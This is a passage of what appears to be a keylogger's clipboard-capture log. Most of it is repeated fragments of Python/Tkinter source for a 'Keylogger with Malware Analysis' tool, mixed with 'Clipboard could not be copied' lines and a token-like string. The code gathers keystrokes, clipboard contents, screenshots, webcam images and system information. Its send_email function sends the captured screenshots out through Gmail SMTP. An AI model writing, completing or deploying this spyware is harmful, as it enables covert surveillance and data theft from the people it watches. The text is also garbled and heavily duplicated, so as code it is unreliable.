    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Function to update the text area with captured clipboard data
    def update_clipboard():
        text_area.delete(1.0, tk.END)  # Clear the text area
        text_area.insert(tk.END, '\n'.join(clipboard_data))  # Display all captured clipboard data

    # Update clipboard info every 1000 milliseconds (1 second)
    def continuous_update_clipboard():
        update_clipboard()
        screen.after(1000, continuous_update_clipboard)  # Schedule next update

    continuous_update_clipboard()  # Start the continuous update

    # Send Email button to send clipboard info via email
    send_email_button = tk.Button(screen, text="Send Clipboard Info via Email", command=lambda: send_email(clipboard_information))
    send_email_button.pack(pady=10)


# Main Application Window with Menus and Logo
def main_screen():
    global text_area, screen, logo_img  # Use the global variables
    screen = tk.Tk()
    screen.geometry("800x600")
    screen.title("Keylogger with Malware Analysis")

    # Load logo image
    logo = Image.open("C:\\Users\\03080\\Desktop\\Picture1.png")  # Replace with your logo image path
    logo = logo.resize((50, 50), Image.Resampling.LANCZOS)  # Resample the image
    logo_img = ImageTk.PhotoImage(logo)

    # Create a top frame to hold the logo and the menu buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo at the top left in a frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    # Welcome interface
    welcome_frame = tk.Frame(screen)
    welcome_frame.pack(expand=True)

    welcome_label = tk.Label(welcome_frame, text="Welcome to the Keylogger with Malware Analysis!", font=("Arial", 16))
    welcome_label.pack(pady=20)


    screen.mainloop()

# Function to show the capture interface
def show_capture_interface():
    global text_area
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Recreate the top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")  # Use the global logo image
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_clipboard_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    # Create the text area for displaying captured logs
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, width=50, height=20)
    text_area.pack(padx=10, pady=10)

    # Function to update the text area with captured logs
    def update_logs():
        text_area.delete(1.0, tk.END)  # Clear the text area
        text_area.insert(tk.END, ''.join(captured_logs))  # Display all captured logs

    # Update logs every 1000 milliseconds (1 second)
    def continuous_update():
        update_logs()
        screen.after(1000, continuous_update)  # Schedule next update

    continuous_update()  # Start the continuous update
    # Send email button at bottom right
    send_email_button = tk.Button(screen, text="Send Email", command=lambda: send_email(keylog_file))
    send_email_button.pack(side=tk.BOTTOM, anchor="e", padx=10, pady=10)


if __name__ == "__main__":
    create_db()  # Set up the database when the program starts
    show_login_interface()  # Start with the login interface
Clipboard Data: 
With these changes, your keylogger application will display captured keylogs in the main interface upon clicking the "Capture Key Logs" button, fulfilling your requirement.
Clipboard Data: 
With these changes, your keylogger application will display captured keylogs in the main interface upon clicking the "Capture Key Logs" button, fulfilling your requirement.
Clipboard Data: 
start_clipboard_capture()
Clipboard Data: 
 def update_clipboard():
        text_area.delete(1.0, tk.END)
Clipboard Data: 
# Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    screenshot_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)
Clipboard Data: 
screenshot_thread.start()
Clipboard Data: 
start_screenshot_capture()
Clipboard Data: 
start_screenshot_capture()
Clipboard Data: 
new screenshot screen.after(30000, take_screenshots)
Clipboard Data: 
def show_screenshot_window():
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Create a top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    screenshot_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipboard info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)

    # Create a frame to hold the screenshot images
    screenshot_frame = tk.Frame(screen)
    screenshot_frame.pack(expand=True, fill=tk.BOTH)

    # Load and display the screenshots
    for screenshot_file in os.listdir(screenshot_dir):
        if screenshot_file.endswith('.png'):
            img_path = os.path.join(screenshot_dir, screenshot_file)
            img = Image.open(img_path)
            img = img.resize((400, 300), Image.Resampling.LANCZOS)  # Resize for display
            img_tk = ImageTk.PhotoImage(img)

            # Create a label to display each screenshot
            screenshot_label = Label(screenshot_frame, image=img_tk)
            screenshot_label.image = img_tk  # Keep a reference to avoid garbage collection
            screenshot_label.pack(padx=10, pady=10)  # Add some padding for better layout

    # Send Email button to send screenshots via email
    send_email_button = tk.Button(screen, text="Send Screenshots via Email", command=lambda: send_email(screenshot_dir))
    send_email_button.pack(pady=10)
Clipboard Data: 
def show_screenshot_window():
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Create a top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    screenshot_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipboard info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)

    # Create a frame to hold the screenshot images
    screenshot_frame = tk.Frame(screen)
    screenshot_frame.pack(expand=True, fill=tk.BOTH)

    # Load and display the screenshots
    for screenshot_file in os.listdir(screenshot_dir):
        if screenshot_file.endswith('.png'):
            img_path = os.path.join(screenshot_dir, screenshot_file)
            img = Image.open(img_path)
            img = img.resize((400, 300), Image.Resampling.LANCZOS)  # Resize for display
            img_tk = ImageTk.PhotoImage(img)

            # Create a label to display each screenshot
            screenshot_label = Label(screenshot_frame, image=img_tk)
            screenshot_label.image = img_tk  # Keep a reference to avoid garbage collection
            screenshot_label.pack(padx=10, pady=10)  # Add some padding for better layout

    # Send Email button to send screenshots via email
    send_email_button = tk.Button(screen, text="Send Screenshots via Email", command=lambda: send_email(screenshot_dir))
    send_email_button.pack(pady=10)
Clipboard Data: 
def show_screenshot_window():
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Create a top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a frame to hold the screenshot images
    screenshot_frame = tk.Frame(screen)
    screenshot_frame.pack(expand=True, fill=tk.BOTH)

    # Function to load and display screenshots
    def load_and_display_screenshots():
        # Clear previous images
        for widget in screenshot_frame.winfo_children():
            widget.destroy()

        # Load and display the screenshots
        for screenshot_file in os.listdir(screenshot_dir):
            if screenshot_file.endswith('.png'):
                img_path = os.path.join(screenshot_dir, screenshot_file)
                img = Image.open(img_path)
                img = img.resize((400, 300), Image.Resampling.LANCZOS)  # Resize for display
                img_tk = ImageTk.PhotoImage(img)

                # Create a label to display each screenshot
                screenshot_label = Label(screenshot_frame, image=img_tk)
                screenshot_label.image = img_tk  # Keep a reference to avoid garbage collection
                screenshot_label.pack(padx=10, pady=10)  # Add some padding for better layout

    # Load and display screenshots for the first time
    load_and_display_screenshots()

    # Function to refresh screenshots every 30 seconds
    def refresh_screenshots():
        load_and_display_screenshots()
        screen.after(30000, refresh_screenshots)  # Schedule next refresh in 30 seconds

    refresh_screenshots()  # Start the refresh cycle

    # Send Email button to send screenshots via email, positioned at the bottom right
    send_email_button = tk.Button(screen, text="Send Screenshots via Email", command=lambda: send_email(screenshot_dir))
    send_email_button.pack(side=tk.BOTTOM, anchor="e", padx=10, pady=10)
Clipboard Data: 
def show_screenshot_window():
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Create a top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a frame to hold the screenshot images
    screenshot_frame = tk.Frame(screen)
    screenshot_frame.pack(expand=True, fill=tk.BOTH)

    # Function to load and display screenshots
    def load_and_display_screenshots():
        # Clear previous images
        for widget in screenshot_frame.winfo_children():
            widget.destroy()

        # Load and display the screenshots
        for screenshot_file in os.listdir(screenshot_dir):
            if screenshot_file.endswith('.png'):
                img_path = os.path.join(screenshot_dir, screenshot_file)
                img = Image.open(img_path)
                img = img.resize((400, 300), Image.Resampling.LANCZOS)  # Resize for display
                img_tk = ImageTk.PhotoImage(img)

                # Create a label to display each screenshot
                screenshot_label = Label(screenshot_frame, image=img_tk)
                screenshot_label.image = img_tk  # Keep a reference to avoid garbage collection
                screenshot_label.pack(padx=10, pady=10)  # Add some padding for better layout

    # Load and display screenshots for the first time
    load_and_display_screenshots()

    # Function to refresh screenshots every 30 seconds
    def refresh_screenshots():
        load_and_display_screenshots()
        screen.after(30000, refresh_screenshots)  # Schedule next refresh in 30 seconds

    refresh_screenshots()  # Start the refresh cycle

    # Send Email button to send screenshots via email, positioned at the bottom right
    send_email_button = tk.Button(screen, text="Send Screenshots via Email", command=lambda: send_email(screenshot_dir))
    send_email_button.pack(side=tk.BOTTOM, anchor="e", padx=10, pady=10)
Clipboard Data: 
def send_email(log_file):
    global user_email
    try:
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = user_email
        msg['Subject'] = "Captured Screenshots"
        body = "Please find the captured screenshots attached."
        msg.attach(MIMEText(body, 'plain'))

        # Attach all screenshot files in the directory
        for screenshot_file in os.listdir(screenshot_dir):
            if screenshot_file.endswith('.png'):
                file_path = os.path.join(screenshot_dir, screenshot_file)
                with open(file_path, "rb") as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f"attachment; filename= {screenshot_file}")
                    msg.attach(part)

        # Sending the email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, password)
        text = msg.as_string()
        server.sendmail(fromaddr, user_email, text)
        server.quit()

        messagebox.showinfo("Success", "Email with screenshots sent successfully!")

    except Exception as e:
        messagebox.showerror("Error", f"Failed to send email: {str(e)}")
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard Data: 
def show_screenshot_window():
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Create a top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a text area to display captured screenshots
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Load and display the screenshots from the current session
    if os.path.exists(session_dir):
        for screenshot_file in os.listdir(session_dir):
            if screenshot_file.endswith('.png'):
                text_area.insert(tk.END, f"{screenshot_file}\n")

    # Send Email button to send screenshots via email
    send_email_button =tk.Button(screen, text="Send Screenshots via Email", command=lambda: send_email(session_dir))
    send_email_button.pack(pady=10)
Clipboard Data: 
def show_screenshot_window():
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Create a top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a text area to display captured screenshots
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Load and display the screenshots from the current session
    if os.path.exists(session_dir):
        for screenshot_file in os.listdir(session_dir):
            if screenshot_file.endswith('.png'):
                text_area.insert(tk.END, f"{screenshot_file}\n")

    # Send Email button to send screenshots via email
    send_email_button =tk.Button(screen, text="Send Screenshots via Email", command=lambda: send_email(session_dir))
    send_email_button.pack(pady=10)
Clipboard Data: 
def show_screenshot_window():
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Create a top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a text area to display captured screenshots
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Load and display the screenshots from the current session
    if os.path.exists(session_dir):
        for screenshot_file in os.listdir(session_dir):
            if screenshot_file.endswith('.png'):
                text_area.insert(tk.END, f"{screenshot_file}\n")

    # Send Email button to send screenshots via email
    send_email_button =tk.Button(screen, text="Send Screenshots via Email", command=lambda: send_email(session_dir))
    send_email_button.pack(pady=10)
Clipboard Data: 
 # Load and display the screenshots from the current session
    if os.path.exists(session_dir):
        for screenshot_file in os.listdir(session_dir):
            if screenshot_file.endswith('.png'):
                text_area.insert(tk.END, f"{screenshot_file}\n")

    # Send Email button to send screenshots via email
    send_email_button =tk.Button(screen, text="Send Screenshots via Email", command=lambda: send_email(session_dir))
    send_email_button.pack(pady=10)
Clipboard Data: 
 # Load and display the screenshots from the current session
    if os.path.exists(session_dir):
        for screenshot_file in os.listdir(session_dir):
            if screenshot_file.endswith('.png'):
                text_area.insert(tk.END, f"{screenshot_file}\n")

    # Send Email button to send screenshots via email
    send_email_button =tk.Button(screen, text="Send Screenshots via Email", command=lambda: send_email(session_dir))
    send_email_button.pack(pady=10)
Clipboard Data: 
webcam_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)

    menu.add_cascade(label="Capture Webcam", menu=webcam_menu)
    webcam_menu.add_command(label="View Captured Webcam", command=show_webcam_window)
Clipboard Data: 
smtplib
Clipboard Data: 

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    screenshot_menu = tk.Menu(menu)
    webcam_menu = tk.Menu(menu)
    malware_analysis_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)

    menu.add_cascade(label="Capture Webcam", menu=webcam_menu)
    webcam_menu.add_command(label="View Captured Webcam", command=show_webcam_window)

    menu.add_cascade(label="Malware Analysis", menu=malware_analysis_menu)
    malware_analysis_menu.add_command(label="View Malware Analysis", command=show_malware_analysis_window)

   
Clipboard Data: 
 # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Recreate the top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)
Clipboard Data: 
co55mqdg975215c0vj8ux9gd0db48bdd46q23qal314b101ba2yovoiwb22f7e95
Clipboard Data: 
co55mqdg975215c0vj8ux9gd0db48bdd46q23qal314b101ba2yovoiwb22f7e95
Clipboard Data: 
def show_malware_analysis_window():
    global text_area

    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Recreate the top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")  # Use the global logo image
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a text area to display submitted files
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    screenshot_menu = tk.Menu(menu)
    webcam_menu = tk.Menu(menu)
    malware_analysis_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=c apture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)

    menu.add_cascade(label="Capture Webcam", menu=webcam_menu)
    webcam_menu.add_command(label="View Captured Webcam", command=show_webcam_window)

    menu.add_cascade(label="Malware Analysis", menu=malware_analysis_menu)
    malware_analysis_menu.add_command(label="View Malware Analysis", command=show_malware_analysis_window)
Clipboard Data: 
Function
Clipboard Data: 
add_submitted_file
Clipboard Data: 
def send_file_to_sandbox(file_path):
    global api_key
    api_key = api_key.strip()

    if not os.path.exists(file_path):
        print(f"File {file_path} does not exist.")
        return

    files = {'file': open(file_path, 'rb')}
    environment_id = "120"

    headers = {
        'User -Agent': 'Falcon Sandbox',
        'api-key': api_key
    }

    data = {
        'environment_id': environment_id
    }

    try:
        response = requests.post(api_url + '/submit/file', files=files, headers=headers, data=data)

        if response.status_code in [200, 201]:
            submission_data = response.json()
            analysis_id = submission_data.get('submission_id')
            print(f"File {file_path} successfully submitted. Analysis ID: {analysis_id}")

            # Add the submitted file to the list
            add_submitted_file(file_path)  # Update the display

        else:
            print(f"Failed to submit {file_path} for analysis. Response code: {response.status_code}")
            print(f"Response text: {response.text}")

    except Exception as e:
        print(f"Error while sending file to sandbox: {str(e)}")
Clipboard Data: 
def show_malware_analysis_window():
    global text_area

    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Create a top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a text area to display submitted files
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Update the display with current submitted files
Clipboard Data: 
def show_malware_analysis_window():
    global text_area

    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Create a top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a text area to display submitted files
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Update the display with current submitted files update_malware_analysis_display()  # Call this to display current submitted files

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add menu items for other functionalities
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    screenshot_menu = tk.Menu(menu)
    webcam_menu = tk.Menu(menu)
    malware_analysis_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipboard info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)

    menu.add_cascade(label="Capture Webcam", menu=webcam_menu)
    webcam_menu.add_command(label="View Captured Webcam", command=show_webcam_window)

    menu.add_cascade(label="Malware Analysis", menu=malware_analysis_menu)
    malware_analysis_menu.add_command(label="View Malware Analysis", command=show_malware_analysis_window)
Clipboard Data: 
def show_malware_analysis_window():
    global text_area

    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Create a top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a text area to display submitted files
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Update the display with current submitted files
    update_malware_analysis_display()  # Call this to display current submitted files

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add menu items for other functionalities
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
